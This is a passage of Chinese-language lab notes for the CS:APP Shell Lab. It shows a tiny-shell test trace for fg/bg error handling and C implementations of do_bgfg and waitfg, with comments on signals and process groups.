<span class=normal><a href=#__codelineno-147-27>27</a></span>
<span class=normal><a href=#__codelineno-147-28>28</a></span>
<span class=normal><a href=#__codelineno-147-29>29</a></span>
<span class=normal><a href=#__codelineno-147-30>30</a></span>
<span class=normal><a href=#__codelineno-147-31>31</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-147-1><a id=__codelineno-147-1 name=__codelineno-147-1></a><span class=m>07</span>-Shell-Lab$<span class=w> </span>make<span class=w> </span>rtest14
</span><span id=__span-147-2><a id=__codelineno-147-2 name=__codelineno-147-2></a>./sdriver.pl<span class=w> </span>-t<span class=w> </span>trace14.txt<span class=w> </span>-s<span class=w> </span>./tshref<span class=w> </span>-a<span class=w> </span><span class=s2>"-p"</span>
</span><span id=__span-147-3><a id=__codelineno-147-3 name=__codelineno-147-3></a><span class=c1>#</span>
</span><span id=__span-147-4><a id=__codelineno-147-4 name=__codelineno-147-4></a><span class=c1># trace14.txt - Simple error handling</span>
</span><span id=__span-147-5><a id=__codelineno-147-5 name=__codelineno-147-5></a><span class=c1>#</span>
</span><span id=__span-147-6><a id=__codelineno-147-6 name=__codelineno-147-6></a>tsh&gt;<span class=w> </span>./bogus
</span><span id=__span-147-7><a id=__codelineno-147-7 name=__codelineno-147-7></a>./bogus:<span class=w> </span>Command<span class=w> </span>not<span class=w> </span>found
</span><span id=__span-147-8><a id=__codelineno-147-8 name=__codelineno-147-8></a>tsh&gt;<span class=w> </span>./myspin<span class=w> </span><span class=m>4</span><span class=w> </span><span class=p>&amp;</span>
</span><span id=__span-147-9><a id=__codelineno-147-9 name=__codelineno-147-9></a><span class=o>[</span><span class=m>1</span><span class=o>]</span><span class=w> </span><span class=o>(</span><span class=m>775626</span><span class=o>)</span><span class=w> </span>./myspin<span class=w> </span><span class=m>4</span><span class=w> </span><span class=p>&amp;</span>
</span><span id=__span-147-10><a id=__codelineno-147-10 name=__codelineno-147-10></a>tsh&gt;<span class=w> </span><span class=nb>fg</span>
</span><span id=__span-147-11><a id=__codelineno-147-11 name=__codelineno-147-11></a><span class=nb>fg</span><span class=w> </span><span class=nb>command</span><span class=w> </span>requires<span class=w> </span>PID<span class=w> </span>or<span class=w> </span>%jobid<span class=w> </span>argument
</span><span id=__span-147-12><a id=__codelineno-147-12 name=__codelineno-147-12></a>tsh&gt;<span class=w> </span><span class=nb>bg</span>
</span><span id=__span-147-13><a id=__codelineno-147-13 name=__codelineno-147-13></a><span class=nb>bg</span><span class=w> </span><span class=nb>command</span><span class=w> </span>requires<span class=w> </span>PID<span class=w> </span>or<span class=w> </span>%jobid<span class=w> </span>argument
</span><span id=__span-147-14><a id=__codelineno-147-14 name=__codelineno-147-14></a>tsh&gt;<span class=w> </span><span class=nb>fg</span><span class=w> </span>a
</span><span id=__span-147-15><a id=__codelineno-147-15 name=__codelineno-147-15></a>fg:<span class=w> </span>argument<span class=w> </span>must<span class=w> </span>be<span class=w> </span>a<span class=w> </span>PID<span class=w> </span>or<span class=w> </span>%jobid
</span><span id=__span-147-16><a id=__codelineno-147-16 name=__codelineno-147-16></a>tsh&gt;<span class=w> </span><span class=nb>bg</span><span class=w> </span>a
</span><span id=__span-147-17><a id=__codelineno-147-17 name=__codelineno-147-17></a>bg:<span class=w> </span>argument<span class=w> </span>must<span class=w> </span>be<span class=w> </span>a<span class=w> </span>PID<span class=w> </span>or<span class=w> </span>%jobid
</span><span id=__span-147-18><a id=__codelineno-147-18 name=__codelineno-147-18></a>tsh&gt;<span class=w> </span><span class=nb>fg</span><span class=w> </span><span class=m>9999999</span>
</span><span id=__span-147-19><a id=__codelineno-147-19 name=__codelineno-147-19></a><span class=o>(</span><span class=m>9999999</span><span class=o>)</span>:<span class=w> </span>No<span class=w> </span>such<span class=w> </span>process
</span><span id=__span-147-20><a id=__codelineno-147-20 name=__codelineno-147-20></a>tsh&gt;<span class=w> </span><span class=nb>bg</span><span class=w> </span><span class=m>9999999</span>
</span><span id=__span-147-21><a id=__codelineno-147-21 name=__codelineno-147-21></a><span class=o>(</span><span class=m>9999999</span><span class=o>)</span>:<span class=w> </span>No<span class=w> </span>such<span class=w> </span>process
</span><span id=__span-147-22><a id=__codelineno-147-22 name=__codelineno-147-22></a>tsh&gt;<span class=w> </span><span class=nb>fg</span><span class=w> </span>%2
</span><span id=__span-147-23><a id=__codelineno-147-23 name=__codelineno-147-23></a>%2:<span class=w> </span>No<span class=w> </span>such<span class=w> </span>job
</span><span id=__span-147-24><a id=__codelineno-147-24 name=__codelineno-147-24></a>tsh&gt;<span class=w> </span><span class=nb>fg</span><span class=w> </span>%1
</span><span id=__span-147-25><a id=__codelineno-147-25 name=__codelineno-147-25></a>Job<span class=w> </span><span class=o>[</span><span class=m>1</span><span class=o>]</span><span class=w> </span><span class=o>(</span><span class=m>775626</span><span class=o>)</span><span class=w> </span>stopped<span class=w> </span>by<span class=w> </span>signal<span class=w> </span><span class=m>20</span>
</span><span id=__span-147-26><a id=__codelineno-147-26 name=__codelineno-147-26></a>tsh&gt;<span class=w> </span><span class=nb>bg</span><span class=w> </span>%2
</span><span id=__span-147-27><a id=__codelineno-147-27 name=__codelineno-147-27></a>%2:<span class=w> </span>No<span class=w> </span>such<span class=w> </span>job
</span><span id=__span-147-28><a id=__codelineno-147-28 name=__codelineno-147-28></a>tsh&gt;<span class=w> </span><span class=nb>bg</span><span class=w> </span>%1
</span><span id=__span-147-29><a id=__codelineno-147-29 name=__codelineno-147-29></a><span class=o>[</span><span class=m>1</span><span class=o>]</span><span class=w> </span><span class=o>(</span><span class=m>775626</span><span class=o>)</span><span class=w> </span>./myspin<span class=w> </span><span class=m>4</span><span class=w> </span><span class=p>&amp;</span>
</span><span id=__span-147-30><a id=__codelineno-147-30 name=__codelineno-147-30></a>tsh&gt;<span class=w> </span><span class=nb>jobs</span>
</span><span id=__span-147-31><a id=__codelineno-147-31 name=__codelineno-147-31></a><span class=o>[</span><span class=m>1</span><span class=o>]</span><span class=w> </span><span class=o>(</span><span class=m>775626</span><span class=o>)</span><span class=w> </span>Running<span class=w> </span>./myspin<span class=w> </span><span class=m>4</span><span class=w> </span><span class=p>&amp;</span>
</span></code></pre></div></td></tr></table></div> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-148-1> 1</a></span>
<span class=normal><a href=#__codelineno-148-2> 2</a></span>
<span class=normal><a href=#__codelineno-148-3> 3</a></span>
<span class=normal><a href=#__codelineno-148-4> 4</a></span>
<span class=normal><a href=#__codelineno-148-5> 5</a></span>
<span class=normal><a href=#__codelineno-148-6> 6</a></span>
<span class=normal><a href=#__codelineno-148-7> 7</a></span>
<span class=normal><a href=#__codelineno-148-8> 8</a></span>
<span class=normal><a href=#__codelineno-148-9> 9</a></span>
<span class=normal><a href=#__codelineno-148-10>10</a></span>
<span class=normal><a href=#__codelineno-148-11>11</a></span>
<span class=normal><a href=#__codelineno-148-12>12</a></span>
<span class=normal><a href=#__codelineno-148-13>13</a></span>
<span class=normal><a href=#__codelineno-148-14>14</a></span>
<span class=normal><a href=#__codelineno-148-15>15</a></span>
<span class=normal><a href=#__codelineno-148-16>16</a></span>
<span class=normal><a href=#__codelineno-148-17>17</a></span>
<span class=normal><a href=#__codelineno-148-18>18</a></span>
<span class=normal><a href=#__codelineno-148-19>19</a></span>
<span class=normal><a href=#__codelineno-148-20>20</a></span>
<span class=normal><a href=#__codelineno-148-21>21</a></span>
<span class=normal><a href=#__codelineno-148-22>22</a></span>
<span class=normal><a href=#__codelineno-148-23>23</a></span>
<span class=normal><a href=#__codelineno-148-24>24</a></span>
<span class=normal><a href=#__codelineno-148-25>25</a></span>
<span class=normal><a href=#__codelineno-148-26>26</a></span>
<span class=normal><a href=#__codelineno-148-27>27</a></span>
<span class=normal><a href=#__codelineno-148-28>28</a></span>
<span class=normal><a href=#__codelineno-148-29>29</a></span>
<span class=normal><a href=#__codelineno-148-30>30</a></span>
<span class=normal><a href=#__codelineno-148-31>31</a></span>
<span class=normal><a href=#__codelineno-148-32>32</a></span>
<span class=normal><a href=#__codelineno-148-33>33</a></span>
<span class=normal><a href=#__codelineno-148-34>34</a></span>
<span class=normal><a href=#__codelineno-148-35>35</a></span>
<span class=normal><a href=#__codelineno-148-36>36</a></span>
<span class=normal><a href=#__codelineno-148-37>37</a></span>
<span class=normal><a href=#__codelineno-148-38>38</a></span>
<span class=normal><a href=#__codelineno-148-39>39</a></span>
<span class=normal><a href=#__codelineno-148-40>40</a></span>
<span class=normal><a href=#__codelineno-148-41>41</a></span>
<span class=normal><a href=#__codelineno-148-42>42</a></span>
<span class=normal><a href=#__codelineno-148-43>43</a></span>
<span class=normal><a href=#__codelineno-148-44>44</a></span>
<span class=normal><a href=#__codelineno-148-45>45</a></span>
<span class=normal><a href=#__codelineno-148-46>46</a></span>
<span class=normal><a href=#__codelineno-148-47>47</a></span>
<span class=normal><a href=#__codelineno-148-48>48</a></span>
<span class=normal><a href=#__codelineno-148-49>49</a></span>
<span class=normal><a href=#__codelineno-148-50>50</a></span>
<span class=normal><a href=#__codelineno-148-51>51</a></span>
<span class=normal><a href=#__codelineno-148-52>52</a></span>
<span class=normal><a href=#__codelineno-148-53>53</a></span>
<span class=normal><a href=#__codelineno-148-54>54</a></span>
<span class=normal><a href=#__codelineno-148-55>55</a></span>
<span class=normal><a href=#__codelineno-148-56>56</a></span>
<span class=normal><a href=#__codelineno-148-57>57</a></span>
<span class=normal><a href=#__codelineno-148-58>58</a></span>
<span class=normal><a href=#__codelineno-148-59>59</a></span>
<span class=normal><a href=#__codelineno-148-60>60</a></span>
<span class=normal><a href=#__codelineno-148-61>61</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-148-1><a id=__codelineno-148-1 name=__codelineno-148-1></a><span class=cm>/* </span>
</span><span id=__span-148-2><a id=__codelineno-148-2 name=__codelineno-148-2></a><span class=cm>* do_bgfg - Execute the builtin bg and fg commands</span>
</span><span id=__span-148-3><a id=__codelineno-148-3 name=__codelineno-148-3></a><span class=cm>*/</span>
</span><span id=__span-148-4><a id=__codelineno-148-4 name=__codelineno-148-4></a><span class=kt>void</span><span class=w> </span><span class=nf>do_bgfg</span><span class=p>(</span><span class=kt>char</span><span class=w> </span><span class=o>**</span><span class=n>argv</span><span class=p>)</span><span class=w> </span>
</span><span id=__span-148-5><a id=__codelineno-148-5 name=__codelineno-148-5></a><span class=p>{</span>
</span><span id=__span-148-6><a id=__codelineno-148-6 name=__codelineno-148-6></a><span class=w>    </span><span class=k>struct</span><span class=w> </span><span class=nc>job_t</span><span class=w> </span><span class=o>*</span><span class=n>job</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=nb>NULL</span><span class=p>;</span><span class=w>           </span><span class=c1>// 要处理的job</span>
</span><span id=__span-148-7><a id=__codelineno-148-7 name=__codelineno-148-7></a><span class=w>    </span><span class=kt>int</span><span class=w> </span><span class=n>state</span><span class=p>;</span><span class=w>                          </span>
</span><span id=__span-148-8><a id=__codelineno-148-8 name=__codelineno-148-8></a><span class=w>    </span><span class=kt>int</span><span class=w> </span><span class=n>id</span><span class=p>;</span><span class=w>                             </span><span class=c1>// 存储jid或pid</span>
</span><span id=__span-148-9><a id=__codelineno-148-9 name=__codelineno-148-9></a><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=o>!</span><span class=n>strcmp</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span><span class=w> </span><span class=s>"bg"</span><span class=p>))</span><span class=w> </span>
</span><span id=__span-148-10><a id=__codelineno-148-10 name=__codelineno-148-10></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-148-11><a id=__codelineno-148-11 name=__codelineno-148-11></a><span class=w>        </span><span class=n>state</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>BG</span><span class=p>;</span>
</span><span id=__span-148-12><a id=__codelineno-148-12 name=__codelineno-148-12></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-148-13><a id=__codelineno-148-13 name=__codelineno-148-13></a><span class=w>    </span><span class=k>else</span>
</span><span id=__span-148-14><a id=__codelineno-148-14 name=__codelineno-148-14></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-148-15><a id=__codelineno-148-15 name=__codelineno-148-15></a><span class=w>        </span><span class=n>state</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>FG</span><span class=p>;</span>
</span><span id=__span-148-16><a id=__codelineno-148-16 name=__codelineno-148-16></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-148-17><a id=__codelineno-148-17 name=__codelineno-148-17></a><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=nb>NULL</span><span class=p>)</span><span class=w>                   </span><span class=c1>// 没带参数</span>
</span><span id=__span-148-18><a id=__codelineno-148-18 name=__codelineno-148-18></a><span class=w>    </span><span class=p>{</span><span class=w>                  </span>
</span><span id=__span-148-19><a id=__codelineno-148-19 name=__codelineno-148-19></a><span class=w>        </span><span class=n>printf</span><span class=p>(</span><span class=s>"%s command requires PID or %%jobid argument</span><span class=se>\n</span><span class=s>"</span><span class=p>,</span><span class=w> </span><span class=n>argv</span><span class=p>[</span><span class=mi>0</span><span class=p>]);</span>
</span><span id=__span-148-20><a id=__codelineno-148-20 name=__codelineno-148-20></a><span class=w>        </span><span class=k>return</span><span class=p>;</span>
</span><span id=__span-148-21><a id=__codelineno-148-21 name=__codelineno-148-21></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-148-22><a id=__codelineno-148-22 name=__codelineno-148-22></a><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>][</span><span class=mi>0</span><span class=p>]</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=sc>'%'</span><span class=p>)</span>
</span><span id=__span-148-23><a id=__codelineno-148-23 name=__codelineno-148-23></a><span class=w>    </span><span class=p>{</span><span class=w>                                    </span><span class=c1>// 说明是jid</span>
</span><span id=__span-148-24><a id=__codelineno-148-24 name=__codelineno-148-24></a><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>sscanf</span><span class=p>(</span><span class=o>&amp;</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>][</span><span class=mi>1</span><span class=p>],</span><span class=w> </span><span class=s>"%d"</span><span class=p>,</span><span class=w> </span><span class=o>&amp;</span><span class=n>id</span><span class=p>)</span><span class=w> </span><span class=o>&gt;</span><span class=w> </span><span class=mi>0</span><span class=p>)</span>
</span><span id=__span-148-25><a id=__codelineno-148-25 name=__codelineno-148-25></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-148-26><a id=__codelineno-148-26 name=__codelineno-148-26></a><span class=w>            </span><span class=n>job</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>getjobjid</span><span class=p>(</span><span class=n>jobs</span><span class=p>,</span><span class=w> </span><span class=n>id</span><span class=p>);</span><span class=w>  </span><span class=c1>// 获得job</span>
</span><span id=__span-148-27><a id=__codelineno-148-27 name=__codelineno-148-27></a><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>job</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=nb>NULL</span><span class=p>)</span>
</span><span id=__span-148-28><a id=__codelineno-148-28 name=__codelineno-148-28></a><span class=w>            </span><span class=p>{</span>
</span><span id=__span-148-29><a id=__codelineno-148-29 name=__codelineno-148-29></a><span class=w>                </span><span class=n>printf</span><span class=p>(</span><span class=s>"%%%d: No such job</span><span class=se>\n</span><span class=s>"</span><span class=p>,</span><span class=w> </span><span class=n>id</span><span class=p>);</span>
</span><span id=__span-148-30><a id=__codelineno-148-30 name=__codelineno-148-30></a><span class=w>                </span><span class=k>return</span><span class=p>;</span>
</span><span id=__span-148-31><a id=__codelineno-148-31 name=__codelineno-148-31></a><span class=w>            </span><span class=p>}</span>
</span><span id=__span-148-32><a id=__codelineno-148-32 name=__codelineno-148-32></a><span class=w>        </span><span class=p>}</span>
</span><span id=__span-148-33><a id=__codelineno-148-33 name=__codelineno-148-33></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-148-34><a id=__codelineno-148-34 name=__codelineno-148-34></a><span class=w>    </span><span class=k>else</span><span class=w> </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=o>!</span><span class=n>isdigit</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>][</span><span class=mi>0</span><span class=p>]))</span><span class=w>      </span><span class=c1>// 其它符号，非法输入</span>
</span><span id=__span-148-35><a id=__codelineno-148-35 name=__codelineno-148-35></a><span class=w>    </span><span class=p>{</span><span class=w>     </span>
</span><span id=__span-148-36><a id=__codelineno-148-36 name=__codelineno-148-36></a><span class=w>        </span><span class=n>printf</span><span class=p>(</span><span class=s>"%s: argument must be a PID or %%jobid</span><span class=se>\n</span><span class=s>"</span><span class=p>,</span><span class=w> </span><span class=n>argv</span><span class=p>[</span><span class=mi>0</span><span class=p>]);</span>
</span><span id=__span-148-37><a id=__codelineno-148-37 name=__codelineno-148-37></a><span class=w>        </span><span class=k>return</span><span class=p>;</span>
</span><span id=__span-148-38><a id=__codelineno-148-38 name=__codelineno-148-38></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-148-39><a id=__codelineno-148-39 name=__codelineno-148-39></a><span class=w>    </span><span class=k>else</span><span class=w>                                </span><span class=c1>// pid</span>
</span><span id=__span-148-40><a id=__codelineno-148-40 name=__codelineno-148-40></a><span class=w>    </span><span class=p>{</span><span class=w>                               </span>
</span><span id=__span-148-41><a id=__codelineno-148-41 name=__codelineno-148-41></a><span class=w>        </span><span class=n>id</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>atoi</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]);</span>
</span><span id=__span-148-42><a id=__codelineno-148-42 name=__codelineno-148-42></a><span class=w>        </span><span class=n>job</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>getjobpid</span><span class=p>(</span><span class=n>jobs</span><span class=p>,</span><span class=w> </span><span class=n>id</span><span class=p>);</span>
</span><span id=__span-148-43><a id=__codelineno-148-43 name=__codelineno-148-43></a><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>job</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=nb>NULL</span><span class=p>)</span>
</span><span id=__span-148-44><a id=__codelineno-148-44 name=__codelineno-148-44></a><span class=w>        </span><span class=p>{</span>
</span><span id=__span-148-45><a id=__codelineno-148-45 name=__codelineno-148-45></a><span class=w>            </span><span class=n>printf</span><span class=p>(</span><span class=s>"(%d): No such process</span><span class=se>\n</span><span class=s>"</span><span class=p>,</span><span class=w> </span><span class=n>id</span><span class=p>);</span>
</span><span id=__span-148-46><a id=__codelineno-148-46 name=__codelineno-148-46></a><span class=w>            </span><span class=k>return</span><span class=p>;</span>
</span><span id=__span-148-47><a id=__codelineno-148-47 name=__codelineno-148-47></a><span class=w>        </span><span class=p>}</span>
</span><span id=__span-148-48><a id=__codelineno-148-48 name=__codelineno-148-48></a>
</span><span id=__span-148-49><a id=__codelineno-148-49 name=__codelineno-148-49></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-148-50><a id=__codelineno-148-50 name=__codelineno-148-50></a><span class=w>    </span><span class=c1>// 正数 PID：表示向单个特定进程发送信号</span>
</span><span id=__span-148-51><a id=__codelineno-148-51 name=__codelineno-148-51></a><span class=w>    </span><span class=c1>// 负数 PID：表示向整个进程组发送信号</span>
</span><span id=__span-148-52><a id=__codelineno-148-52 name=__codelineno-148-52></a><span class=w>    </span><span class=c1>// 一个作业可能包含多个进程（如管道命令 ls | grep xxx）</span>
</span><span id=__span-148-53><a id=__codelineno-148-53 name=__codelineno-148-53></a><span class=w>    </span><span class=c1>// 为了确保作业的所有组成部分都被正确恢复，必须向整个进程组发送 SIGCONT 信号</span>
</span><span id=__span-148-54><a id=__codelineno-148-54 name=__codelineno-148-54></a><span class=w>    </span><span class=n>Kill</span><span class=p>(</span><span class=o>-</span><span class=p>(</span><span class=n>job</span><span class=o>-&gt;</span><span class=n>pid</span><span class=p>),</span><span class=w> </span><span class=n>SIGCONT</span><span class=p>);</span><span class=w>         </span><span class=c1>// 重启进程, 这里发送到进程组</span>
</span><span id=__span-148-55><a id=__codelineno-148-55 name=__codelineno-148-55></a><span class=w>    </span><span class=n>job</span><span class=o>-&gt;</span><span class=n>state</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>state</span><span class=p>;</span>
</span><span id=__span-148-56><a id=__codelineno-148-56 name=__codelineno-148-56></a><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>state</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=n>BG</span><span class=p>)</span>
</span><span id=__span-148-57><a id=__codelineno-148-57 name=__codelineno-148-57></a><span class=w>        </span><span class=n>printf</span><span class=p>(</span><span class=s>"[%d] (%d) %s"</span><span class=p>,</span><span class=n>job</span><span class=o>-&gt;</span><span class=n>jid</span><span class=p>,</span><span class=w> </span><span class=n>job</span><span class=o>-&gt;</span><span class=n>pid</span><span class=p>,</span><span class=w> </span><span class=n>job</span><span class=o>-&gt;</span><span class=n>cmdline</span><span class=p>);</span>
</span><span id=__span-148-58><a id=__codelineno-148-58 name=__codelineno-148-58></a><span class=w>    </span><span class=k>else</span><span class=w> </span>
</span><span id=__span-148-59><a id=__codelineno-148-59 name=__codelineno-148-59></a><span class=w>        </span><span class=n>waitfg</span><span class=p>(</span><span class=n>job</span><span class=o>-&gt;</span><span class=n>pid</span><span class=p>);</span>
</span><span id=__span-148-60><a id=__codelineno-148-60 name=__codelineno-148-60></a><span class=w>    </span><span class=k>return</span><span class=p>;</span>
</span><span id=__span-148-61><a id=__codelineno-148-61 name=__codelineno-148-61></a><span class=p>}</span>
</span></code></pre></div></td></tr></table></div> </li> <li> <h3 id=waitfg>waitfg<a class=headerlink href=#waitfg title="Permanent link">¶</a></h3> <p>这个函数要求实现阻塞父进程，直到当前的前台进程不再是前台进程了。</p> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-149-1> 1</a></span>
<span class=normal><a href=#__codelineno-149-2> 2</a></span>
<span class=normal><a href=#__codelineno-149-3> 3</a></span>
<span class=normal><a href=#__codelineno-149-4> 4</a></span>
<span class=normal><a href=#__codelineno-149-5> 5</a></span>
<span class=normal><a href=#__codelineno-149-6> 6</a></span>
<span class=normal><a href=#__codelineno-149-7> 7</a></span>
<span class=normal><a href=#__codelineno-149-8> 8</a></span>
<span class=normal><a href=#__codelineno-149-9> 9</a></span>
<span class=normal><a href=#__codelineno-149-10>10</a></span>
<span class=normal><a href=#__codelineno-149-11>11</a></span>
<span class=normal><a href=#__codelineno-149-12>12</a></span>
<span class=normal><a href=#__codelineno-149-13>13</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-149-1><a id=__codelineno-149-1 name=__codelineno-149-1></a><span class=cm>/* </span>
</span><span id=__span-149-2><a id=__codelineno-149-2 name=__codelineno-149-2></a><span class=cm>* waitfg - Block until process pid is no longer the foreground process</span>
</span><span id=__span-149-3><a id=__codelineno-149-3 name=__codelineno-149-3></a><span class=cm>*/</span>
</span><span id=__span-149-4><a id=__codelineno-149-4 name=__codelineno-149-4></a><span class=kt>void</span><span class=w> </span><span class=nf>waitfg</span><span class=p>(</span><span class=kt>pid_t</span><span class=w> </span><span class=n>pid</span><span class=p>)</span>
</span><span id=__span-149-5><a id=__codelineno-149-5 name=__codelineno-149-5></a><span class=p>{</span>
</span><span id=__span-149-6><a id=__codelineno-149-6 name=__codelineno-149-6></a><span class=w>    </span><span class=kt>sigset_t</span><span class=w> </span><span class=n>mask</span><span class=p>;</span>
</span><span id=__span-149-7><a id=__codelineno-149-7 name=__codelineno-149-7></a><span class=w>    </span><span class=n>Sigemptyset</span><span class=p>(</span><span class=o>&amp;</span><span class=n>mask</span><span class=p>);</span><span class=w>   </span>
</span><span id=__span-149-8><a id=__codelineno-149-8 name=__codelineno-149-8></a><span class=w>    </span><span class=k>while</span><span class=w> </span><span class=p>(</span><span class=n>fgpid</span><span class=p>(</span><span class=n>jobs</span><span class=p>)</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=mi>0</span><span class=p>)</span>
</span><span id=__span-149-9><a id=__codelineno-149-9 name=__codelineno-149-9></a><span class=w>    </span><span class=p>{</span><span class=w>                      </span><span class=c1>// 执行一个原子操作：将shell进程的信号掩码临时设置为空集，然后挂起shell进程</span>
</span><span id=__span-149-10><a id=__codelineno-149-10 name=__codelineno-149-10></a><span class=w>        </span><span class=n>sigsuspend</span><span class=p>(</span><span class=o>&amp;</span><span class=n>mask</span><span class=p>);</span><span class=w> </span><span class=c1>// 等待任何信号的到达。当前台进程终止或状态改变时，会发送 SIGCHLD 信号。</span>
</span><span id=__span-149-11><a id=__codelineno-149-11 name=__codelineno-149-11></a><span class=w>    </span><span class=p>}</span><span class=w>                      </span><span class=c1>// shell 的信号处理函数会捕获这个信号</span>
</span><span id=__span-149-12><a id=__codelineno-149-12 name=__codelineno-149-12></a><span class=w>    </span><span class=k>return</span><span class=p>;</span>
</span><span id=__span-149-13><a id=__codelineno-149-13 name=__codelineno-149-13></a><span class=p>}</span>
</span></code></pre></div></td></tr></table></div> </li> <li> <h3 id=sigchld_handlersigint_handlersigtstp_handler>信号处理函数实现 sigchld_handler/sigint_handler/sigtstp_handler<a class=headerlink href=#sigchld_handlersigint_handlersigtstp_handler title="Permanent link">¶</a></h3> <p>实现一个 SIGCHLD 信号处理函数，能够回收所有僵死进程:</p> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-150-1> 1</a></span>
<span class=normal><a href=#__codelineno-150-2> 2</a></span>
<span class=normal><a href=#__codelineno-150-3> 3</a></span>
<span class=normal><a href=#__codelineno-150-4> 4</a></span>
<span class=normal><a href=#__codelineno-150-5> 5</a></span>
<span class=normal><a href=#__codelineno-150-6> 6</a></span>
<span class=normal><a href=#__codelineno-150-7> 7</a></span>
<span class=normal><a href=#__codelineno-150-8> 8</a></span>
<span class=normal><a href=#__codelineno-150-9> 9</a></span>
<span class=normal><a href=#__codelineno-150-10>10</a></span>
<span class=normal><a href=#__codelineno-150-11>11</a></span>
<span class=normal><a href=#__codelineno-150-12>12</a></span>
<span class=normal><a href=#__codelineno-150-13>13</a></span>
<span class=normal><a href=#__codelineno-150-14>14</a></span>
<span class=normal><a href=#__codelineno-150-15>15</a></span>
<span class=normal><a href=#__codelineno-150-16>16</a></span>
<span class=normal><a href=#__codelineno-150-17>17</a></span>
<span class=normal><a href=#__codelineno-150-18>18</a></span>
<span class=normal><a href=#__codelineno-150-19>19</a></span>
<span class=normal><a href=#__codelineno-150-20>20</a></span>
<span class=normal><a href=#__codelineno-150-21>21</a></span>
<span class=normal><a href=#__codelineno-150-22>22</a></span>
<span class=normal><a href=#__codelineno-150-23>23</a></span>
<span class=normal><a href=#__codelineno-150-24>24</a></span>
<span class=normal><a href=#__codelineno-150-25>25</a></span>
<span class=normal><a href=#__codelineno-150-26>26</a></span>
<span class=normal><a href=#__codelineno-150-27>27</a></span>
<span class=normal><a href=#__codelineno-150-28>28</a></span>
<span class=normal><a href=#__codelineno-150-29>29</a></span>
<span class=normal><a href=#__codelineno-150-30>30</a></span>
<span class=normal><a href=#__codelineno-150-31>31</a></span>
<span class=normal><a href=#__codelineno-150-32>32</a></span>
<span class=normal><a href=#__codelineno-150-33>33</a></span>
<span class=normal><a href=#__codelineno-150-34>34</a></span>
<span class=normal><a href=#__codelineno-150-35>35</a></span>
<span class=normal><a href=#__codelineno-150-36>36</a></span>
<span class=normal><a href=#__codelineno-150-37>37</a></span>
<span class=normal><a href=#__codelineno-150-38>38</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-150-1><a id=__codelineno-150-1 name=__codelineno-150-1></a><span class=cm>/* </span>
</span><span id=__span-150-2><a id=__codelineno-150-2 name=__codelineno-150-2></a><span class=cm>* sigchld_handler - The kernel sends a SIGCHLD to the shell whenever</span>
</span><span id=__span-150-3><a id=__codelineno-150-3 name=__codelineno-150-3></a><span class=cm>*     a child job terminates (becomes a zombie), or stops because it</span>
</span><span id=__span-150-4><a id=__codelineno-150-4 name=__codelineno-150-4></a><span class=cm>*     received a SIGSTOP or SIGTSTP signal. The handler reaps all</span>
</span><span id=__span-150-5><a id=__codelineno-150-5 name=__codelineno-150-5></a><span class=cm>*     available zombie children, but doesn't wait for any other</span>
</span><span id=__span-150-6><a id=__codelineno-150-6 name=__codelineno-150-6></a><span class=cm>*     currently running children to terminate.  </span>
</span><span id=__span-150-7><a id=__codelineno-150-7 name=__codelineno-150-7></a><span class=cm>*/</span>
</span><span id=__span-150-8><a id=__codelineno-150-8 name=__codelineno-150-8></a><span class=kt>void</span><span class=w> </span><span class=nf>sigchld_handler</span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>sig</span><span class=p>)</span><span class=w> </span>
</span><span id=__span-150-9><a id=__codelineno-150-9 name=__codelineno-150-9></a><span class=p>{</span>
